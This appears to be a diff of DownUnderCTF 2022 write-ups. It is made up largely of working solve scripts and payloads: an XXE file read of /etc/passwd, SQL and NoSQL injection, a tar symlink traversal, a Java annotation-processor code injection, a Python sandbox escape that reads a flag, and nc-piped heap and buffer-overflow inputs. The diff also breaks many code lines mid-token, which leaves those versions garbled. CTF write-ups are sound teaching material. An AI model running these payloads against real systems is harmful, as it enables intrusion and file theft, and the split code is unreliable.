@@ -44,11 +44,6 @@
 37
 38
 39
-```
-
-
-
-```
 from z3 import *
 
 class baby_arx:
@@ -86,11 +81,6 @@ m = sol.model()
 key = [m[k].as_long() for k in key]
 print(bytes(key))
 # DUCTF{i_d0nt_th1nk_th4ts_h0w_1t_w0rks_actu4lly_92f45fb961ecf420}
-```
-
-
-
-```
 1
 2
 3
@@ -112,11 +102,6 @@ print(bytes(key))
 19
 20
 21
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 from os import urandom, path
@@ -135,11 +120,6 @@ def main():
 
 if __name__ == '__main__':
  main()
-```
-
-
-
-```
 1
 2
 3
@@ -167,11 +147,6 @@ if __name__ == '__main__':
 25
 26
 27
-```
-
-
-
-```
 from pwn import *
 
 def xor(a, b):
@@ -196,11 +171,6 @@ for x, y in zip(enc2, enc1[1:]):
  pt += xor(xor(x, pt[-16:]), y)
 print(pt)
 # DUCTF{0fb_mu5t_4ctu4lly_st4nd_f0r_0bvi0usly_f4ul7y_bl0ck_c1ph3r_m0d3_0f_0p3ra710n_7b9cb403e8332c980456b17a00abd51049cb8207581c274fcb233f3a43df4a}
-```
-
-
-
-```
 1
 2
 3
@@ -227,11 +197,6 @@ print(pt)
 24
 25
 26
-```
-
-
-
-```
 p = 55899879511190230528616866117179357211
 V = GF(p)^3
 R.<x> = PolynomialRing(GF(p))
@@ -258,11 +223,6 @@ check_phi_C = V_pow(phi_A, n).pairwise_product(V_pow(phi_B, m))
 
 if phi_C == check_phi_C:
  print(open('./flag.txt', 'r').read().strip())
-```
-
-
-
-```
 1
 2
 3
@@ -343,11 +303,6 @@ if phi_C == check_phi_C:
 78
 79
 80
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 import signal, time
@@ -425,11 +380,6 @@ def main():
 if __name__ == '__main__':
  signal.alarm(TIMEOUT)
  main()
-```
-
-
-
-```
 1
 2
 3
@@ -460,11 +410,6 @@ if __name__ == '__main__':
 28
 29
 30
-```
-
-
-
-```
 from pwn import *
 
 # context.log_level = 'debug'
@@ -493,29 +438,14 @@ for x in range(l, r + 1):
  io.interactive()
  break
 # DUCTF{d1d_y0u_us3_b1n4ry_s34rch?}
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 12c12
 < MAX_INTERVALS = 384
 ---
 > MAX_INTERVALS = 1
-```
-
-
-
-```
 1
 2
 3
@@ -586,11 +516,6 @@ for x in range(l, r + 1):
 68
 69
 70
-```
-
-
-
-```
 from pwn import *
 import gmpy2
 
@@ -652,17 +577,13 @@ def attempt():
  io.sendline(str(res).encode())
  print(io.recvlineS())
  return True
- except:
+ 
+except:
  return False
 
 while not attempt():
  pass
 # DUCTF{Manger_w0uld_b3_pr0ud_0f_y0u}
-```
-
-
-
-```
 1
 2
 3
@@ -671,11 +592,6 @@ while not attempt():
 6
 7
 8
-```
-
-
-
-```
 11,13c11,13
 < TIMEOUT = 10 * 60
 < MAX_INTERVALS = 1
@@ -684,11 +600,6 @@ while not attempt():
 > TIMEOUT = 3 * 60
 > MAX_INTERVALS = 4
 > MAX_QUERIES = 4700
-```
-
-
-
-```
 1
 2
 3
@@ -762,11 +673,6 @@ while not attempt():
 71
 72
 73
-```
-
-
-
-```
 from pwn import process, remote, context
 import random
 from Crypto.Util.number import sieve_base
@@ -797,7 +703,8 @@ def connect():
  io.sendafter(b"> ", f"1\n{lb}\n{ub}\n".encode())
 
  # cand = [random.randint(1, N) for _ in range(4700)]
- cand = [power_mod(pr, -1, N) for pr in sieve_base[:4700]]
+ cand = [power_mod(pr, -1, N) for pr in sieve_base[:
+4700]]
  io.sendlineafter(b"> ", b"2")
  io.sendlineafter(b"queries: ", ",".join([str(c*power_mod(a,e,N)%N) for a in cand]).encode())
  res = list(map(int, io.recvlineS().strip().split(",")))
@@ -837,11 +744,6 @@ while True:
  print(io.recvlineS())
  break
 # DUCTF{rsa_1nt3rv4l_0r4cl3_1s_n0_m4tch_f0r_y0u!}
-```
-
-
-
-```
 1
 2
 3
@@ -874,11 +776,6 @@ while True:
 30
 31
 32
-```
-
-
-
-```
 from hashlib import sha256
 from Crypto.Util.Padding import unpad
 from Crypto.Cipher import AES
@@ -907,11 +804,6 @@ key = sha256(str(f(n)).encode()).digest()
 aes = AES.new(key, AES.MODE_ECB)
 flag = unpad(aes.decrypt(ct), 16)
 print(flag.decode())
-```
-
-
-
-```
 1
 2
 3
@@ -971,11 +863,6 @@ print(flag.decode())
 57
 58
 59
-```
-
-
-
-```
 p = 275344354044844896633734474527970577743
 a = [2367876727, 2244612523, 2917227559, 2575298459, 3408491237, 3106829771, 3453352037]
 alpha = [
@@ -1031,11 +918,6 @@ aes = AES.new(key, AES.MODE_ECB)
 flag = unpad(aes.decrypt(ct), 16)
 print(flag.decode())
 # DUCTF{p4y_t0_w1n_91ea0a7b4b688fc8}
-```
-
-
-
-```
 1
 2
 3
@@ -1047,11 +929,6 @@ print(flag.decode())
 9
 10
 11
-```
-
-
-
-```
 28c28
 < intervals = []
 ---
@@ -1060,14 +937,9 @@ print(flag.decode())
 > if queries_used > 0:
 > print('No more queries allowed!')
 > continue
-> 
+>
 65d68
 < time.sleep(MAX_INTERVALS * (MAX_QUERIES // N_BITS - 1))
-```
-
-
-
-```
 1
 2
 3
@@ -1141,11 +1013,6 @@ print(flag.decode())
 71
 72
 73
-```
-
-
-
-```
 from pwn import process, remote, context
 import random
 from Crypto.Util.number import sieve_base
@@ -1168,7 +1035,8 @@ def connect():
  ub = []
 
  # cand = [random.randint(1, N) for _ in range(4700)]
- cand = [power_mod(pr, -1, N) for pr in sieve_base[:4700]]
+ cand = [power_mod(pr, -1, N) for pr in sieve_base[:
+4700]]
  io.sendlineafter(b"> ", b"2")
  io.sendlineafter(
  b"queries: ", ",".join([str(c * power_mod(a, e, N) % N) for a in cand]).encode()
@@ -1216,78 +1084,35 @@ while True:
  print(io.recvlineS())
  break
 # DUCTF{rsa_1nt3rv4l_0r4cl3_1s_s3ri0usly_n0_m4tch_f0r_y0u...94b2a797eb5e0105}
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 RewriteEngine On
 RewriteCond %{HTTP_HOST} !^localhost$
 RewriteRule ".*" "-" [F]
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 RewriteEngine On
 RewriteCond %{THE_REQUEST} flag
 RewriteRule ".*" "-" [F]
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
-curl 'http://34.87.217.252:30026/one/flag.txt' -H 'Host: localhost'
-curl 'http://34.87.217.252:30026/two/fl%61g.txt'
+curl 'http://34.87.217.252:
+30026/one/flag.txt' -H 'Host: localhost'
+curl 'http://34.87.217.252:
+30026/two/fl%61g.txt'
 
 DUCTF{thats_it_next_time_im_using_nginx}
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 .\hashcat.exe -a 0 -m 16500 .\hash.txt ..\rockyou.txt
 secret: onepiece
 DUCTF{7h3-0n3-p13c3-15-4ll-7h3-fl465-y0u-637-4l0n6-7h3-w4y}
-```
-
-
-
-```
 1
 2
 3
@@ -1306,11 +1131,6 @@ DUCTF{7h3-0n3-p13c3-15-4ll-7h3-fl465-y0u-637-4l0n6-7h3-w4y}
 16
 17
 18
-```
-
-
-
-```
 def findInternalFilepath(filename):
  try:
  prop = None
@@ -1321,19 +1141,17 @@ def findInternalFilepath(filename):
  if internalNode != None:
  prop = {
  "Fieldname":"absPath",
- "Attribute":internalNode.attrib["url"],
- "Value":internalNode.text
+ "Attribute":
+internalNode.attrib["url"],
+ "Value":
+internalNode.text
  }
  return prop
 
- except Exception:
+ 
+except Exception:
  print("couldnt extract absPath")
  return None
-```
-
-
-
-```
 1
 2
 3
@@ -1341,23 +1159,16 @@ def findInternalFilepath(filename):
 5
 6
 7
-```
-
-
-
-```
 <!DOCTYPE peko[
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <!-- ... -->
-<x15ac:absPath url="/Users/Shared/" xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac" >&xxe;</x15ac:absPath>
+<x15ac:
+absPath url="/Users/Shared/" xmlns:
+x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac" >&xxe;</x15ac:
+absPath>
 
 DUCTF{cexxelsyd_work_my_dyslexxec_friend}
-```
-
-
-
-```
 1
 2
 3
@@ -1391,11 +1202,6 @@ DUCTF{cexxelsyd_work_my_dyslexxec_friend}
 31
 32
 33
-```
-
-
-
-```
 import httpx
 import asyncio
 import string
@@ -1426,25 +1232,10 @@ async def main():
 
 asyncio.run(main())
 # DUCTF{n0sql1_1s_th3_new_5qli}
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 ssh-keygen -t rsa -b 4096 -m PEM -f myjwt.key
 openssl rsa -in myjwt.key -pubout -outform PEM -out myjwt.pub
-```
-
-
-
-```
 1
 2
 3
@@ -1515,24 +1306,29 @@ openssl rsa -in myjwt.key -pubout -outform PEM -out myjwt.pub
 68
 69
 70
-```
-
-
-
-```
 # Flag is in the root as /flag (see attached Dockerfile)
 
 require 'sinatra'
 require 'securerandom'
 
-set :environment, :production
+set :
+environment, :
+production
 
 def err(s)
- erb :index, :locals => {:links => [], :error => s}
+ erb :
+index, :
+locals => {:
+links => [], :
+error => s}
 end
 
 def ok(l)
- erb :index, :locals => {:links => l, :error => nil}
+ erb :
+index, :
+locals => {:
+links => l, :
+error => nil}
 end
 
 get '/' do
@@ -1540,13 +1336,16 @@ get '/' do
 end
 
 post '/' do
- unless params[:tarfile] && (tempfile = params[:tarfile][:tempfile])
+ unless params[:
+tarfile] && (tempfile = params[:
+tarfile][:
+tempfile])
  return err "File not sent"
  end
  unless tempfile.size <= 10240
  return err "File too big"
- end 
- 
+ end
+
  path = SecureRandom.hex 16
  unless Dir.mkdir "uploads/#{path}", 0755
  return err "Error creating directory"
@@ -1555,7 +1354,8 @@ post '/' do
  return err "Error extracting tar file"
  end
 
- links = Dir.glob("uploads/#{path}/**/*", File::FNM_DOTMATCH).select do |f|
+ links = Dir.glob("uploads/#{path}/**/*", File::
+FNM_DOTMATCH).select do |f|
  # Don't show . or ..
  if [".", ".."].include? File.basename f
  false
@@ -1576,9 +1376,11 @@ post '/' do
 end
 
 get '/uploads/*' do
- filepath = "uploads/#{::Rack::Utils.clean_path_info params['splat'].first}"
+ filepath = "uploads/#{::
+Rack::
+Utils.clean_path_info params['splat'].first}"
  halt 404 unless File.file? filepath
- send_file filepath 
+ send_file filepath
 end
 
 not_found do
@@ -1590,11 +1392,6 @@ error 500 do
  status 500
  '500'
 end
-```
-
-
-
-```
 1
 2
 3
@@ -1616,11 +1413,6 @@ end
 19
 20
 21
-```
-
-
-
-```
 import tarfile
 import io
 
@@ -1642,11 +1434,6 @@ with tarfile.open("./out.tar", "w") as tar:
  link.linkname = "/flag"
  tar.addfile(link)
 # DUCTF{are_symlinks_really_worth_the_trouble_they_cause?????}
-```
-
-
-
-```
 1
 2
 3
@@ -1707,11 +1494,6 @@ with tarfile.open("./out.tar", "w") as tar:
 58
 59
 60
-```
-
-
-
-```
 from flask import Flask, request
 import textwrap
 import sqlite3
@@ -1725,13 +1507,14 @@ app = Flask(__name__)
 @app.route('/', methods=['POST'])
 def root_post():
  post = request.form
- 
+
  # Sent params?
  if 'username' not in post or 'password' not in post:
  return 'Username or password missing from request'
 
  # We are recreating this every request
- con = sqlite3.connect(':memory:')
+ con = sqlite3.connect(':
+memory:')
  cur = con.cursor()
  cur.execute('CREATE TABLE users (username TEXT, password TEXT)')
  cur.execute(
@@ -1742,16 +1525,16 @@ def root_post():
  'SELECT * FROM users WHERE username = {post[username]!r} AND password = {post[password]!r}'
  .format(post=post)
  ).fetchone()
- 
+
  # Credentials OK?
  if output is None:
  return 'Wrong credentials'
- 
+
  # Nothing suspicious?
  username, password = output
  if username != post["username"] or password != post["password"]:
  return 'Wrong credentials (are we being hacked?)'
- 
+
  # Everything is all good
  return f'Welcome back {post["username"]}! The flag is in FLAG.'.format(post=post)
 
@@ -1760,23 +1543,22 @@ def root_get():
  return textwrap.dedent('''
  <html>
  <head></head>
- <body>
+ 
  <form action="/" method="post">
- <p>Welcome to admin panel!</p>
+ Welcome to admin panel!
  <label for="username">Username:</label>
- <input type="text" id="username" name="username"><br><br>
+ 
+
+
  <label for="password">Password:</label>
- <input type="text" id="password" name="password"><br><br>
- <input type="submit" value="Submit">
- </form> 
- </body>
+ 
+
+
+ 
+ </form>
+ 
  </html>
  ''').strip()
-```
-
-
-
-```
 1
 2
 3
@@ -1827,11 +1609,6 @@ def root_get():
 48
 49
 50
-```
-
-
-
-```
 import os
 import sqlite3
 import hashlib
@@ -1854,7 +1631,8 @@ payload = payload.replace("###", str(offset)).replace("@@@", str(offset + 1))
 
 post = {"username": username, "password": payload}
 
-con = sqlite3.connect(":memory:")
+con = sqlite3.connect(":
+memory:")
 cur = con.cursor()
 cur.execute("CREATE TABLE users (username TEXT, password TEXT)")
 cur.execute(
@@ -1882,11 +1660,6 @@ print(
  requests.post("https://web-sqli2022-85d13aec009e.2022.ductf.dev/", data=post).text
 )
 # DUCTF{alternative_solution_was_just_to_crack_the_hash_:p}
-```
-
-
-
-```
 1
 2
 3
@@ -1904,11 +1677,6 @@ print(
 15
 16
 17
-```
-
-
-
-```
 def check_java_is_valid(folder)->bool:
  class_files = list_files(folder, allowed_ext=".java")
 
@@ -1920,17 +1688,13 @@ def check_java_is_valid(folder)->bool:
  # Using subprocess.run prevents any command injection students could exploit
  try:
  returned_code = subprocess.run(["/usr/bin/javac", "-d", temp_output]+class_files)
- except:
+ 
+except:
  return False
  finally:
  os.chdir(old_cwd)
- 
+
  return returned_code == 0
-```
-
-
-
-```
 1
 2
 3
@@ -1958,11 +1722,6 @@ def check_java_is_valid(folder)->bool:
 25
 26
 27
-```
-
-
-
-```
 import java.util.Set;
 
 import javax.annotation.processing.AbstractProcessor;
@@ -1990,11 +1749,6 @@ public class Pwn extends AbstractProcessor {
  return false;
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -2007,11 +1761,6 @@ public class Pwn extends AbstractProcessor {
 10
 11
 12
-```
-
-
-
-```
 {
  "type": "service_account",
  "project_id": "downunderctf-2022-chal-mjb",
@@ -2024,23 +1773,8 @@ public class Pwn extends AbstractProcessor {
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/buildkite-agent%40downunderctf-2022-chal-mjb.iam.gserviceaccount.com"
 }
-```
-
-
-
-```
 1
-```
-
-
-
-```
 https://discord.com/oauth2/authorize?client_id=1006037829345882173&permissions=0&scope=bot%20applications.commands
-```
-
-
-
-```
 1
 2
 3
@@ -2054,11 +1788,6 @@ https://discord.com/oauth2/authorize?client_id=1006037829345882173&permissions=0
 11
 12
 13
-```
-
-
-
-```
 with open('/flag.txt', 'rb') as f:
  FLAG = int.from_bytes(f.read().strip(), byteorder='big')
 
@@ -2066,17 +1795,13 @@ assert FLAG < 2**1024
 
 while True:
  print("Enter your number:")
- 
+
  try:
  n = FLAG * int(input("> "))
  print("Your digit is:", str(n)[-1])
- except ValueError:
+ 
+except ValueError:
  print("Not a valid number! >:(")
-```
-
-
-
-```
 1
 2
 3
@@ -2110,11 +1835,6 @@ while True:
 31
 32
 33
-```
-
-
-
-```
 from pwn import *
 
 # io = process(["python", "last-digit.py"])
@@ -2129,7 +1849,8 @@ def oracle(x):
  try:
  io.sendlineafter(b">", str(x).encode())
  return b"Your digit" in io.recvline()
- except:
+ 
+except:
  io = remote("2022.ductf.dev", 30003)
  return oracle(x)
 
@@ -2146,11 +1867,6 @@ print(l)
 print(r)
 print(l.to_bytes(128, "big"))
 # CTF{14288_bits_should_be_enough_for_anybody_:)}
-```
-
-
-
-```
 1
 2
 3
@@ -2177,11 +1893,6 @@ print(l.to_bytes(128, "big"))
 24
 25
 26
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 import subprocess
@@ -2204,47 +1915,22 @@ with tempfile.NamedTemporaryFile() as sandbox:
  pipes = subprocess.Popen(["python3", sandbox.name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
  _, stderr = pipes.communicate()
  if pipes.returncode == 0:
- print("Syntax OK!") 
+ print("Syntax OK!")
  else:
  print("There was an error:")
  print(stderr.decode())
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 import sys
 import os
 print(os.popen('cat /chal/flag.txt').read(), file=sys.stderr)
 exit(1)
 # DUCTF{next_time_ill_just_use_ast.parse}
-```
-
-
-
-```
 1
-```
-
-
-
-```
 python -m zipapp exp; (cat exp.pyz; printf '\n__EOF__\n') | nc 2022.ductf.dev 30002
-```
-
-
-
-```
 1
 2
 3
@@ -2346,11 +2032,6 @@ python -m zipapp exp; (cat exp.pyz; printf '\n__EOF__\n') | nc 2022.ductf.dev 30
 99
 100
 101
-```
-
-
-
-```
 import subprocess
 import requests
 
@@ -2364,7 +2045,7 @@ __asm__ (
  ".byte 0xFF\n"
  ".endr\n"
  ".popsection\n"
- 
+
  // create a relocation that tries to modify our section at some offset
  // based on a single byte of the flag; if it is out of bounds then the
  // linker will error
@@ -2402,7 +2083,8 @@ void dummy(){
 }
 struct LOL{};
 """
- # r = requests.post("http://localhost:8000/", data={"code": code}).text
+ # r = requests.post("http://localhost:
+8000/", data={"code": code}).text
  r = requests.post(
  "https://misc-i-c-u-php-16347326eb82.2022.ductf.dev", data={"code": code}
  ).text
@@ -2449,11 +2131,6 @@ for flag_offset in range(starti, starti + 100):
  flag += chr(l)
  print(flag)
 # DUCTF{pr3pr0c3ssOrPoWer3dPHPpEEk1ngPuzZLe_2b842b}
-```
-
-
-
-```
 1
 2
 3
@@ -2463,12 +2140,8 @@ for flag_offset in range(starti, starti + 100):
 7
 8
 9
-```
-
-
-
-```
-%:line 59 "/var/www/html/config.php"
+%:
+line 59 "/var/www/html/config.php"
 fo;
 struct xb{
 int b;
@@ -2477,31 +2150,16 @@ int b;
 int main(){
 for(;;){}
 }
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 # fmt: off
 ar = [0xc4, 0xda, 0xc5, 0xdb, 0xce, 0x80, 0xf8, 0x3e, 0x82, 0xe8, 0xf7, 0x82, 0xef, 0xc0, 0xf3, 0x86, 0x89, 0xf0, 0xc7, 0xf9, 0xf7, 0x92, 0xca, 0x8c, 0xfb, 0xfc, 0xff, 0x89, 0xff, 0x93, 0xd1, 0xd7, 0x84, 0x80, 0x87, 0x9a, 0x9b, 0xd8, 0x97, 0x89, 0x94, 0xa6, 0x89, 0x9d, 0xdd, 0x94, 0x9a, 0xa7, 0xf3, 0xb2]
 # fmt: on
 print(bytes([(x ^ 0x42) - 0x42 - i for i, x in enumerate(ar)]))
 # DUCTF{r3v_is_3asy_1f_y0u_can_r34d_ass3mbly_r1ght?}
-```
-
-
-
-```
 1
 2
 3
@@ -2515,11 +2173,6 @@ print(bytes([(x ^ 0x42) - 0x42 - i for i, x in enumerate(ar)]))
 11
 12
 13
-```
-
-
-
-```
 from base64 import b64decode as g
 
 f = bytes.fromhex
@@ -2533,11 +2186,6 @@ flag += b"_ZGVhZGIzM2ZjYWZl"
 flag += g(g("ZlE9PQ=="))
 print(flag)
 # DUCTF{did_you_use_a_TAS?_ZGVhZGIzM2ZjYWZl}
-```
-
-
-
-```
 1
 2
 3
@@ -2564,11 +2212,6 @@ print(flag)
 24
 25
 26
-```
-
-
-
-```
 function search(ar, target, path = []) {
 	let res = null
 	ar.forEach((x, i) => {
@@ -2595,11 +2238,6 @@ dec = []
 for (var i = 0; i < 64; i++) dec.push(String.fromCodePoint(C[i] ^ K[i]))
 console.log(dec.join(''))
 // DUCTF{s3arch1ng_thr0ugh_an_arr4y_1s_n0t_th4t_h4rd_ab894d8dfea17}
-```
-
-
-
-```
 1
 2
 3
@@ -2609,11 +2247,6 @@ console.log(dec.join(''))
 7
 8
 9
-```
-
-
-
-```
 #!/usr/bin/env python3
 
 from ctypes import CDLL, c_buffer
@@ -2623,28 +2256,19 @@ buf2 = c_buffer(512)
 libc.gets(buf1)
 if b'DUCTF' in bytes(buf2):
  print(open('./flag.txt', 'r').read())
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaDUCTF
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaDUCTF
 
 DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}
-```
-
-
-
-```
 1
 2
 3
@@ -2766,19 +2390,14 @@ DUCTF{C_is_n0t_s0_f0r31gn_f0r_incr3d1bl3_pwn3rs}
 119
 120
 121
-```
+    #include <stdio.h>
+    #include 
+    #include <string.h>
+    #include <stdlib.h>
 
-
-
-```
-#include <stdio.h>
-#include <unistd.h>
-#include <string.h>
-#include <stdlib.h>
-
-#define NUM_USERS 0x8
-#define USERNAME_LEN 0x18
-#define ADMIN_UID 0x1337
+    #define NUM_USERS 0x8
+    #define USERNAME_LEN 0x18
+    #define ADMIN_UID 0x1337
 
 typedef struct {
  int uid;
@@ -2888,41 +2507,16 @@ int main() {
  }
  }
 }
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 if(!user->uid) {
  user->uid = curr_user_id;
 }
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 (printf '1\n0\nxxxxaaaabbbb\0\0\0\0\0\0\0\0\x51\x0d\x02\0\0\0\0\0\x37\x13\n1\n0\npeko\n2\npeko\n'; cat) | nc 2022.ductf.dev 30025
 # DUCTF{th3_4uth_1s_s0_bad_1t_d0esnt_ev3n_us3_p4ssw0rds}
-```
-
-
-
-```
 1
 2
 3
@@ -2939,11 +2533,6 @@ if(!user->uid) {
 14
 15
 16
-```
-
-
-
-```
 // SPDX-License-Identifier: MIT
 
 pragma solidity ^0.8.0;
@@ -2958,13 +2547,8 @@ contract SolveMe {
  function solveChallenge() external {
  isSolved = true;
  }
- 
+
 }
-```
-
-
-
-```
 1
 2
 3
@@ -2994,11 +2578,6 @@ contract SolveMe {
 27
 28
 29
-```
-
-
-
-```
 const Web3 = require('web3')
 const web3 = new Web3('https://blockchain-solveme-4dc7ba0b99f5ae1b-eth.2022.ductf.dev/')
 const fs = require('fs/promises')
@@ -3028,11 +2607,6 @@ const fs = require('fs/promises')
  console.log(receipt)
  })
 })()
-```
-
-
-
-```
 1
 2
 3
@@ -3072,11 +2646,6 @@ const fs = require('fs/promises')
 37
 38
 39
-```
-
-
-
-```
 // SPDX-License-Identifier: MIT
 
 pragma solidity ^0.8.0;
@@ -3116,11 +2685,6 @@ contract SecretAndEphemeral {
  payable(msg.sender).transfer(balance);
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -3164,11 +2728,6 @@ contract SecretAndEphemeral {
 41
 42
 43
-```
-
-
-
-```
 const Web3 = require('web3')
 const web3 = new Web3('https://blockchain-secretandephemeral-6afda207eb1b22a1-eth.2022.ductf.dev/')
 const eth = web3.eth
@@ -3212,11 +2771,6 @@ const contactAddr = '0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8'
 // the owner address is 0x7BCF8A237e5d8900445C148FC2b119670807575b
 // calls `retrieveTheFunds` with these parameters to solve the challenge
 // DUCTF{u_r_a_web3_t1me_7raveler_:)}
-```
-
-
-
-```
 1
 2
 3
@@ -3230,11 +2784,6 @@ const contactAddr = '0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8'
 11
 12
 13
-```
-
-
-
-```
 //SPDX-License-Identifier: Unlicensed
 pragma solidity ^0.8.0;
 
@@ -3248,11 +2797,6 @@ contract DUCoin is ERC20, Ownable {
  _mint(addr, 1337);
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -3309,11 +2853,6 @@ contract DUCoin is ERC20, Ownable {
 54
 55
 56
-```
-
-
-
-```
 //SPDX-License-Identifier: Unlicensed
 pragma solidity ^0.8.0;
 
@@ -3370,11 +2909,6 @@ contract Casino is Ownable {
  }
  }
 }
-```
-
-
-
-```
 1
 2
 3
@@ -3444,11 +2978,6 @@ contract Casino is Ownable {
 67
 68
 69
-```
-
-
-
-```
 const Web3 = require('web3')
 const web3 = new Web3('https://blockchain-cryptocasino-4addd2f7a74c6ceb-eth.2022.ductf.dev/')
 const fs = require('fs/promises')
